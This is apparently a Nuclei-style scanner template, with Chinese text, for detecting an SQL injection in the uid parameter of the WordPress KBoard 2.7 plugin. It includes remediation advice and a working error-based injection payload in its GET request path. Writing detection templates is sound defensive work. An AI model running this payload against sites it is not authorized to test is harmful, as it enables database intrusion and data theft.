id: Wordpress-KBoard_Plugins-SQLi
info:
  name: WordPress_KBoard_2.7_board.php_SQL注入漏洞
  author:
  - l0ne1y
  description: |-
    WordPress Plugin KBoard board.php SQL注入漏洞
    WordPress是Wordpress基金会的一套使用PHP语言开发的博客平台。该平台支持在PHP和MySQL的服务器上架设个人博客网站。WordPress plugin是WordPress开源的一个应用插件。

    WordPress KBoard 2.7版本/wp-content/plugins/kboard/board.php存在输入验证错误漏洞，导致uid参数产生sql注入漏洞。
  severity: high
  remediation: |-
    官方修复方案：
    1、建议用户到官方获取最新补丁或者最新版本程序：https://wordpress.org/plugins/

    临时修复方案：
    1、使用预编译语句，使用PDO需要注意不要将变量直接拼接到PDO语句中。所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中。当前几乎所有的数据库系统都提供了参数化SQL语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。
    2、对进入数据库的特殊字符（’”<>&*;等）进行转义处理，或编码转换。
    3、确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为int型。
    4、数据长度应该严格规定，能在一定程度上防止比较长的SQL注入语句无法正确执行。
    5、网站每个数据层的编码统一，建议全部使用UTF-8编码，上下层编码不一致有可能导致一些过滤模型被绕过。
    6、严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击对数据库的危害。
    7、避免网站显示SQL错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。
    8、过滤危险字符，例如：采用正则表达式匹配union、sleep、and、select、load_file等关键字，如果匹配到则终止运行。
requests:
- matchers:
  - type: status
    status:
    - 200
  - type: word
    words:
    - c4ca4238a0b923820dcc509a6f75849b
  matchers-condition: and
  path:
  - '{{BaseURL}}/wp-content/plugins/kboard/board.php?pageid=1&board_id=1&mod=document&uid=1%20OR%20(SELECT%202*(IF((SELECT%20*%20FROM%20(SELECT%20CONCAT((SELECT%20MID((IFNULL(CAST(md5(1)%20AS%20CHAR),0x20)),1,451)),0x78))s),%208446744073709551610,%208446744073709551610)))'
  method: GET
